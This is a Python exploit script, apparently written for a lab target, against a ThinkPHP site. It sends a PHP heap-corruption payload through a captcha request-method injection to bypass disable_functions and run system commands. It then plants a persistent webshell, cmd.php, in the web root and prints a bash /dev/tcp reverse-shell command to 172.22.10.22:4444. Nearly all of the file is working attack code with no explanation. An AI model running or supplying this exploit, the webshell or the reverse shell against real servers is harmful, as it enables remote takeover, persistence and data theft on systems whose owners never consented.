# -*- coding: utf-8 -*-
import requests, base64, time
import urllib3
urllib3.disable_warnings()

TARGET = "http://172.22.10.3"

EXPLOIT_PHP = r'''<?php
error_reporting(0);
$cmd = "__CMD__";
class Helper { public $a, $b, $c; }
class Pwn {
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;
    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) { $groom[] = self::alloc(self::STRING_SIZE); $groom[] = self::alloc(self::HT_STRING_SIZE); }
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);
        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) { return; }
        $this->helper->a = "leet"; $this->helper->b = function($x) {}; $this->helper->c = 0xfeedface;
        $closure_addr = $this->rel_read(0x20);
        $closure_ce = $this->read($closure_addr + 0x10);
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $zif_system = $this->get_system($basic_funcs);
        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) { $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i)); }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $this->rel_write($fake_closure_off + 0x68, $zif_system);
        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);
        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }
    private function heap_leak() { $arr = [[], []]; set_error_handler(function() use (&$arr, &$buf) { $arr = 1; $buf = str_repeat("\x00", self::HT_STRING_SIZE); }); $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array")); return $buf; }
    private function free($addr) { $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr); $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload)); $arr = [[], []]; set_error_handler(function() use (&$arr, &$buf, &$payload) { $arr = 1; $buf = str_repeat($payload, 1); }); $arr[1] .= "x"; }
    private function rel_read($offset) { return self::str2ptr($this->abc, $offset); }
    private function rel_write($offset, $value, $n = 8) { for ($i = 0; $i < $n; $i++) { $this->abc[$offset + $i] = chr($value & 0xff); $value >>= 8; } }
    private function read($addr, $n = 8) { $this->rel_write(0x10, $addr - 0x10); $value = strlen($this->helper->a); if($n !== 8) { $value &= (1 << ($n << 3)) - 1; } return $value; }
    private function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = $this->read($addr); $f_name = $this->read($f_entry, 6); if($f_name === 0x6d6574737973) { return $this->read($addr + 8); } $addr += 0x20; } while($f_entry !== 0); }
    private function get_basic_funcs($addr) { while(true) { $addr -= 0x10; if($this->read($addr, 4) === 0xA8 && in_array($this->read($addr + 4, 4), [20180731, 20190902, 20200930, 20210902])) { $module_name_addr = $this->read($addr + 0x20); $module_name = $this->read($module_name_addr); if($module_name === 0x647261646e617473) { return $this->read($addr + 0x28); } } } }
    static function alloc($size) { return str_shuffle(str_repeat("A", $size)); }
    static function str2ptr($str, $p = 0, $n = 8) { $address = 0; for($j = $n - 1; $j >= 0; $j--) { $address <<= 8; $address |= ord($str[$p + $j]); } return $address; }
}
new Pwn($cmd);
die();
?>'''

def include_php(code):
    files = {'file': ('p.php', code, 'application/octet-stream')}
    data = {
        '_method': '__construct',
        'filter[]': ['glob', 'current', 'think\\__include_file'],
        'method': 'get',
        'server[REQUEST_METHOD]': '/tmp/php*'
    }
    r = requests.post(f'{TARGET}/index.php?s=captcha', data=data, files=files, timeout=30, allow_redirects=False)
    end = r.text.find('<!DOCTYPE')
    return r.text[:end] if end > 0 else r.text

def run_cmd(cmd):
    php = EXPLOIT_PHP.replace("__CMD__", cmd)
    return include_php(php.encode())

# Write webshell using PHP file_put_contents (via include method, not via system)
print("=== Write webshell via PHP ===")
webshell_b64 = base64.b64encode(open("c:\\Users\\Administrator\\Desktop\\云境靶机\\blackmaze\\test_wwwdata_shell.py", "rb").read()).decode()

# Actually, let me write it more simply using the include+file_put_contents approach
php_write_shell = r'''<?php
error_reporting(0);

$shell = '<?php
error_reporting(0);
if(!isset($_REQUEST["c"])){echo "cmd shell ok"; exit;}
$cmd = $_REQUEST["c"];
class Helper { public $a, $b, $c; }
class Pwn {
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;
    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) { $groom[] = self::alloc(self::STRING_SIZE); $groom[] = self::alloc(self::HT_STRING_SIZE); }
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);
        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) { return; }
        $this->helper->a = "leet"; $this->helper->b = function($x) {}; $this->helper->c = 0xfeedface;
        $closure_addr = $this->rel_read(0x20);
        $closure_ce = $this->read($closure_addr + 0x10);
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $zif_system = $this->get_system($basic_funcs);
        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) { $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i)); }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $this->rel_write($fake_closure_off + 0x68, $zif_system);
        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);
        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }
    private function heap_leak() { $arr = [[], []]; set_error_handler(function() use (&$arr, &$buf) { $arr = 1; $buf = str_repeat("\\x00", self::HT_STRING_SIZE); }); $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array")); return $buf; }
    private function free($addr) { $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr); $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload)); $arr = [[], []]; set_error_handler(function() use (&$arr, &$buf, &$payload) { $arr = 1; $buf = str_repeat($payload, 1); }); $arr[1] .= "x"; }
    private function rel_read($offset) { return self::str2ptr($this->abc, $offset); }
    private function rel_write($offset, $value, $n = 8) { for ($i = 0; $i < $n; $i++) { $this->abc[$offset + $i] = chr($value & 0xff); $value >>= 8; } }
    private function read($addr, $n = 8) { $this->rel_write(0x10, $addr - 0x10); $value = strlen($this->helper->a); if($n !== 8) { $value &= (1 << ($n << 3)) - 1; } return $value; }
    private function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = $this->read($addr); $f_name = $this->read($f_entry, 6); if($f_name === 0x6d6574737973) { return $this->read($addr + 8); } $addr += 0x20; } while($f_entry !== 0); }
    private function get_basic_funcs($addr) { while(true) { $addr -= 0x10; if($this->read($addr, 4) === 0xA8 && in_array($this->read($addr + 4, 4), [20180731, 20190902, 20200930, 20210902])) { $module_name_addr = $this->read($addr + 0x20); $module_name = $this->read($module_name_addr); if($module_name === 0x647261646e617473) { return $this->read($addr + 0x28); } } } }
    static function alloc($size) { return str_shuffle(str_repeat("A", $size)); }
    static function str2ptr($str, $p = 0, $n = 8) { $address = 0; for($j = $n - 1; $j >= 0; $j--) { $address <<= 8; $address |= ord($str[$p + $j]); } return $address; }
}
new Pwn($cmd);
?>';

$r = file_put_contents("/var/www/html/public/cmd.php", $shell);
echo "write=" . ($r !== false ? $r : "FAIL") . "\n";
echo "exists=" . (file_exists("/var/www/html/public/cmd.php") ? "Y" : "N") . "\n";
die();
?>'''
print(include_php(php_write_shell.encode()))

time.sleep(1)

# Test the webshell
print("\n=== Test webshell ===")
r = requests.get(f"{TARGET}/cmd.php", timeout=5, allow_redirects=False)
print(f"Access: {r.status_code} | {r.text[:50]}")

r = requests.get(f"{TARGET}/cmd.php", params={'c': 'id;whoami;hostname'}, timeout=10, allow_redirects=False)
print(f"Cmd test: {r.status_code}")
print(r.text[:300])

# Reverse shell command
print("\n=== To get reverse shell, run on your machine: ===")
print("nc -lvnp 4444")
print(f"\nThen visit: {TARGET}/cmd.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/172.22.10.22/4444+0>%261'")
